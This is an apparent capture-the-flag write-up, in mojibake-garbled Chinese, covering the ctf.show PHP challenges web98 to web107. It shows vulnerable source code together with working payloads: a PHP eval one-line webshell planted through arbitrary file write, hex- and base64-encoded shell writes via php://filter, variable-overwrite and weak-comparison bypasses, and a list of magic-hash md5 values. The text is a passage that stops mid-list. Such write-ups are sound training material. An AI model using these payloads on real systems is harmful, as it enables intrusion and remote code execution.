<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#è‹¥å­˜åœ¨GETä¼ å€¼ï¼Œç”¨POSTçš„å€¼è¦†ç›–</span></span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#flagå‚æ•°ç­‰äºflagï¼Œå°±ç”¨$_COOKIEè¿›è¡Œè¦†ç›–ã€‚è¿™é‡Œè®©flagå‚æ•°ä¸ç­‰äºflagå€¼å°±å¥½äº†</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#å­˜åœ¨HTTP_FLAGå‚æ•°ç­‰äºflagï¼Œå°±å‡ºæœ€ç»ˆçš„flagç­”æ¡ˆ</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¸‰å…ƒè¿ç®—ç¬¦åœ¨cè¯­è¨€é‡Œå­¦è¿‡ï¼Œä¸éš¾ç†è§£<strong>ä¸‰å…ƒè¿ç®—ç¬¦è¯­æ³•ï¼šæ¡ä»¶ ? ç»“æœ1 : ç»“æœ2</strong>è¯´æ˜ï¼šé—®å·å‰é¢çš„ä½ç½®æ˜¯åˆ¤æ–­çš„æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶æ—¶æ‰§è¡Œç»“æœ1ï¼Œä¸æ»¡è¶³æ—¶æ‰§è¡Œç»“æœ2ã€‚</p>
<p>è¿™å¥ä»£ç å¯ä»¥å±•å¼€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¸€æ—¦ç”¨getæ–¹æ³•ä¼ å…¥å‚æ•°ï¼Œå°±ä¼šæŠŠgetæ–¹æ³•æ”¹ä¸ºpostæ–¹æ³•ï¼Œè¿™é‡Œè¾¾åˆ°äº†ä¿®æ”¹getæ–¹æ³•åœ°å€çš„ç›®çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°</span></span><br><span class="line">å€)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¸­é—´ä¸¤è¡Œä»£ç ä¸éœ€è¦è€ƒè™‘ï¼Œå› ä¸ºä¸æäº¤ flag å‚æ•°ï¼Œåªè¦åœ¨ç”¨getæ–¹æ³•ä¼ å…¥å‚æ•°çš„åŸºç¡€ä¸Šå†postä¼  <strong>HTTP_FLAG&#x3D;flag</strong>ï¼Œå³å¯å¾—åˆ°flagã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//c8c910aa-6434-42db-9dde-1db5025cffba.chall.ctf.show/?1</span></span><br><span class="line">ç„¶åPOSTæ•°æ®ï¼šHTTP_FLAG=flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web99ï¼ˆin-arrayå¼±ç±»å‹æ¯”è¾ƒï¼‰"><a href="#web99ï¼ˆin-arrayå¼±ç±»å‹æ¯”è¾ƒï¼‰" class="headerlink" title="web99ï¼ˆin_arrayå¼±ç±»å‹æ¯”è¾ƒï¼‰"></a>web99ï¼ˆin_arrayå¼±ç±»å‹æ¯”è¾ƒï¼‰</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿™é¢˜çªç ´ç‚¹åœ¨in_array()å‡½æ•°</p>
<p><strong>in_array()</strong><br>in_arrayï¼š(PHP 4, PHP 5, PHP 7)</p>
<p>åŠŸèƒ½ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</p>
<p>å®šä¹‰ï¼š<code> bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
<p>åœ¨ $haystackä¸­æœç´¢ $needleï¼Œ<code>å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° $strictçš„å€¼ä¸º TRUEï¼Œåˆ™ in_array()å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œ</code>æ£€æŸ¥ $needleçš„ç±»å‹æ˜¯å¦å’Œ $haystackä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° $haystackï¼Œåˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚</p>
<p>å¾ˆæ˜æ˜¾ï¼Œè¿™é¢˜å†ä½¿ç”¨in_array()å‡½æ•°æ—¶å¹¶æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºTRUE,æ‰€ä»¥æ­¤æ—¶æ˜¯&#x3D;&#x3D;çš„å¼±ç±»å‹æ¯”è¾ƒã€‚</p>
<p>**ç»•è¿‡æ–¹æ³•:**ä¼ å…¥n&#x3D;1.phpã€‚å› ä¸ºPHPåœ¨ä½¿ç”¨ in_array()å‡½æ•°åˆ¤æ–­æ—¶ï¼Œä¼šå°† 1.phpå¼ºåˆ¶è½¬æ¢æˆæ•°å­—1ï¼Œè€Œæ•°å­—1åœ¨ range(1,24)æ•°ç»„ä¸­ï¼Œå½“éšæœºç”Ÿæˆçš„æ•°å­—æ­£å¥½æ˜¯1æ—¶ç»•è¿‡ in_array()å‡½æ•°åˆ¤æ–­ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?n=<span class="number">1</span>.php   </span><br><span class="line">post:   content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>  <span class="comment">#å†™å…¥ä¸€å¥è¯</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å¤šè¯•å‡ æ¬¡ï¼Œç›´åˆ°ä¸æŠ¥é”™çš„é‚£ä¸€æ¬¡ï¼Œè¯´æ˜æˆåŠŸä¼ å…¥ä¸€å¥è¯ã€‚</p>
<p>ç„¶åè®¿é—®<code>https://url/1.php</code>,å†postä¼ å…¥<code>1=system(&#39;ls&#39;);</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>å†è®¿é—®è¿™ä¸ªflag36d.php,å³post: 1&#x3D;<code>system(&#39;cat flag36d.php&#39;);</code></p>
<p>ç„¶ååœ¨ç½‘é¡µæºç ä¸­çœ‹åˆ°flag</p>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å¾ˆæ˜æ˜¾è¦getä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶ä¸”ä¿è¯<code>is_numeric($v1) and is_numeric($v2) and is_numeric($v3)</code>çš„ç»“æœæ˜¯Trueï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯v1å’Œv2å’Œv3ä¸­è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯æ•°å­—å°±è¡Œã€‚</p>
<p>ç¬¬äºŒéƒ¨åˆ†:<br>å› ä¸ºæºç ä¸­ç»™äº†æç¤º ï¼šflag in class ctfshow;ï¼Œæ‰€ä»¥è¾“å‡ºä¸€ä¸ªæ–°çš„â€ctfshowâ€ç±»ï¼Œæ„é€ :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


<p>å¾—åˆ° flag_is_bde4fb430x2d62590x2d404f0x2dbaa30x2da2d6bd94ed98<br><code>æŠŠox2dæ¢æˆ-ï¼Œå†å¥—ä¸Šctfshow&#123;&#125;å³å¯</code></p>
<p>æ³¨æ„è¿™é‡Œv3åªèƒ½åŒ…å«;ï¼Œå¯ä»¥æ˜¯å¤šä¸ªå åŠ ï¼Œä½†ä¸èƒ½æœ‰å…¶ä»–å­—ç¬¦ã€‚</p>
<h2 id="åˆ©ç”¨var-dumpçš„è§£æ³•ï¼š"><a href="#åˆ©ç”¨var-dumpçš„è§£æ³•ï¼š" class="headerlink" title="åˆ©ç”¨var_dumpçš„è§£æ³•ï¼š"></a>åˆ©ç”¨var_dumpçš„è§£æ³•ï¼š</h2><p>var_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
<p>æ„é€ :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¸¤ç§æ–¹æ³•å‡å¯ï¼ŒåŸç†æ˜¯ç›´æ¥æ‰“å°ctfshowç±»çš„ä¿¡æ¯ã€‚</p>
<h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><p>è¿™é¢˜åœ¨web100çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p>
<p>åå°„ä¸€ä¸‹ç±»å³å¯ï¼Œnew ReflectionClass</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


<p>å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯è¦çˆ†ç ´16æ¬¡flagå°‘ç»™ä¸€ä½ã€‚</p>
<h1 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h1><h3 id="hex2bin-å‡½æ•°"><a href="#hex2bin-å‡½æ•°" class="headerlink" title="hex2bin()å‡½æ•°"></a>hex2bin()å‡½æ•°</h3><p><strong>ä½œç”¨</strong>:æŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦</p>
<h3 id="substr-å‡½æ•°"><a href="#substr-å‡½æ•°" class="headerlink" title="substr() å‡½æ•°"></a>substr() å‡½æ•°</h3><p>è¯­æ³•:**substr(string,start,length)**å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">6</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>åˆ™è¾“å‡ºä»ç¬¬å…­ä½å¼€å§‹ï¼Œå³è¾“å‡ºâ€worldâ€</p>
<h3 id="call-user-func-å‡½æ•°"><a href="#call-user-func-å‡½æ•°" class="headerlink" title="call_user_func()å‡½æ•°"></a>call_user_func()å‡½æ•°</h3><p>è¯­æ³•:<strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong></p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p>
<p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>is_numericåœ¨php5çš„ç¯å¢ƒä¸­ï¼Œæ˜¯å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶çš„ã€‚</p>
<p>å…ˆæŠŠä¸€å¥è¯ç¼–ç æˆåå…­è¿›åˆ¶ä¼ ç»™v2:</p>
<p><code>&lt;?php eval($_POST[1]);?&gt;</code>å˜ä¸º<code>0x3c3f706870206576616c28245f504f53545b315d293b3f3e</code></p>
<p>æ„é€ :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v2=<span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="number">1</span>.php</span><br><span class="line">v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä½†æ˜¯æ²¡æœ‰æˆåŠŸå†™å…¥ï¼Œå‚è€ƒäº†å¤§ä½¬çš„åšå®¢ï¼Œå¾—çŸ¥è¿™é‡Œçš„ç‰ˆæœ¬å¯èƒ½æ˜¯php7ï¼Œè¿™ä¸€ä¸²åå…­è¿›åˆ¶ä¸èƒ½è¢«is_numeric()è¯†åˆ«æˆæ•°å­—ï¼Œv2å¿…é¡»ç”±çº¯æ•°å­—æ„æˆã€‚</p>
<p>è¿™é‡Œç”¨å¤§ä½¬çš„payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //è¿™é‡Œç›´æ¥ç”¨å»æ‰=çš„base64</span><br><span class="line">è¾“å‡º   <span class="number">5044383959474e6864434171594473</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚<br />å¤§å®¶å¯ä»¥å°è¯•ä¸‹å»æ‰&#x3D;å’Œå¸¦ç€&#x3D;çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚å› ä¸ºç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ã€‚</p>
<p>åŒæ—¶å› ä¸ºç»è¿‡substrå¤„ç†ï¼Œæ‰€ä»¥v2å‰é¢è¿˜è¦è¡¥ä¸¤ä½ä»»æ„æ•°å­—ï¼Œè¿™é‡Œä½¿ç”¨00</p>
<p>æœ€ç»ˆæ„é€ :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php </span></span><br><span class="line"></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>


<p>è®¿é—®1.phpï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flag</p>
<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>æ•°ç»„ç»•è¿‡</p>
<h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><p>å˜é‡è¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?suces=flag </span><br><span class="line">POST: error=suces</span><br></pre></td></tr></table></figure>


<p>å…ˆåˆ†æè¿™ä¸ªgetè¯·æ±‚:</p>
<p>å½“ä¼ å…¥suces&#x3D;flagæ—¶ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯$suces&#x3D;$flag<br />å³æŠŠflagèµ‹å€¼ç»™äº†suceså˜é‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å†çœ‹postè¯·æ±‚:</p>
<p>ä¼ å…¥error&#x3D;suces,å¾—åˆ°error&#x3D;$suces&#x3D;$flag </p>
<p>å³æˆåŠŸæŠŠflagçš„å€¼èµ‹ç»™äº†errorå˜é‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æ‰€ä»¥èƒ½æˆåŠŸå›æ˜¾å‡ºflag</p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­,suceså˜é‡åªæ˜¯èµ·åˆ°äº†ä¸€ä¸ªä¼ é€’çš„ä½œç”¨ï¼Œæ‰€ä»¥å¯ä»¥è¢«ä»»æ„æ›¿æ¢ï¼Œå³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?a=flag </span><br><span class="line">POST: error=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?v2[]=a </span><br><span class="line">POST: v1[]=b</span><br></pre></td></tr></table></figure>


<h1 id="web107-parse-strå˜é‡è¦†ç›–"><a href="#web107-parse-strå˜é‡è¦†ç›–" class="headerlink" title="web107(parse_strå˜é‡è¦†ç›–)"></a>web107(parse_strå˜é‡è¦†ç›–)</h1><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p>parse_str() å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚</p>
<p>æ³¨é‡Š:å¦‚æœæœªè®¾ç½® array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚</p>
<p>æ³¨é‡Š:php.ini æ–‡ä»¶ä¸­çš„ magic_quotes_gpc è®¾ç½®å½±å“è¯¥å‡½æ•°çš„è¾“å‡ºã€‚å¦‚æœå·²å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨ parse_str() è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashes() è½¬æ¢ã€‚</p>
<ul>
<li>Parse_str()å‡½æ•°å¼•èµ·çš„å˜é‡è¦†ç›–æ¼æ´<br>  <code>parse_str() </code>å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚æœæ²¡æœ‰<code>array å‚æ•°</code>ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ æåº¦ä¸å»ºè®® åœ¨æ²¡æœ‰ arrayå‚æ•°çš„æƒ…å†µä¸‹ä½¿ç”¨æ­¤å‡½æ•°ï¼Œå¹¶ä¸”åœ¨ PHP 7.2 ä¸­å°†åºŸå¼ƒä¸è®¾ç½®å‚æ•°çš„è¡Œä¸ºã€‚æ­¤å‡½æ•°æ²¡æœ‰è¿”å›å€¼</li>
</ul>
<p>è¦å¾—åˆ°flagï¼Œéœ€è¦v2ä¸­flagçš„å€¼ä¸ä¼ å…¥v3çš„md5çš„å€¼ç›¸åŒ:</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">getï¼š?v3=<span class="number">1</span></span><br><span class="line">post:v1=flag=c4ca4238a0b923820dcc509a6f75849b <span class="comment">#md5è§£å¯†åå¯¹åº”1</span></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">0x01</span> <span class="title function_ invoke__">md5</span>(str)</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span 